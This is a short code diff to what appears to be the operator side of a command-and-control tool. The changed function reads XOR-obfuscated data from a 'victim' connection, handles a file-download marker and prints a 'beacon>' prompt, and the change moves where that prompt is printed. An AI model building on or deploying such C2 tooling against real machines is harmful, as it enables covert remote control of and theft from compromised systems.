@@ -109,8 +109,6 @@ void *Socket_Reader(){
     fflush(NULL);
     while (a.kill == 0 && (n = read(a.dest, buffer, MAXBUF)) > 0) {
 
-	if(a.kill == 0){printf("beacon> ");}
-
 	xorbuffer = XOR(buffer, key, n, keylen);
 	if(str_starts_with(xorbuffer, "--HUNTER DOWNLOAD--") == 0){
 		char* xorconfirm = XOR("OK", key, 5, keylen);
@@ -120,6 +118,8 @@ void *Socket_Reader(){
 		continue;
 
 	}
+
+	if(a.kill == 0){printf("beacon> ");}
 
         if (write(STDOUT_FILENO, xorbuffer, n) < 0)  // writes data from victim fd to stdout
             printf("Error in function write()\n");
